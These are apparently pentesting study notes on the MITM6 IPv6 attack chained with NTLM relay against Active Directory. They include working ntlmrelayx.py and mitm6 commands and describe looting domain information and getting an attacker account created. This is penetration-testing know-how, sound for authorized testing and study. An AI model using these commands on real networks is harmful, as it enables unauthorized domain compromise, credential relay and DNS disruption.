# IPv6 Attack

**MITM6**:

MITM6 attack is the go to attack for internal pentesting an organization. This attack requires on access to the system. MITM6 uses NTLM relay as well to pass the authentication. You can only run this attack for 5-10 min blocks. This WILL break DNS things and stuff on the network.

```jsx
ntlmrelayx.py -6 -t ldaps://domaincontrollerIP -wh fakewpad.marvel.local -l lootme
```

-6, IPv6

-t, Target

-wh, Fakepad proxy

-l, loot directory and using lootme will just name the file

AFTER you run the above command you can proceed and run the below command

```jsx
sudo mitm6 -d <domain name>
```

Wait for traffic to generate such as reboots of computers or users logging into the devices.

For example if a device is rebooted on the network the MITM6 will use itself as the DNS server and loot the directory of the machine and pull files to your kali box that have lists of domain admins, domain groups, computer names, domain admins by security group, etc.

If an admin account logs in while the MITM6 tool is running and the account logging in is NOT apart of the protected groups and can be delegated, the tool will create the attacker a username and password to login to AD with, this account is in the file text under where the NTLM relay tool is running.
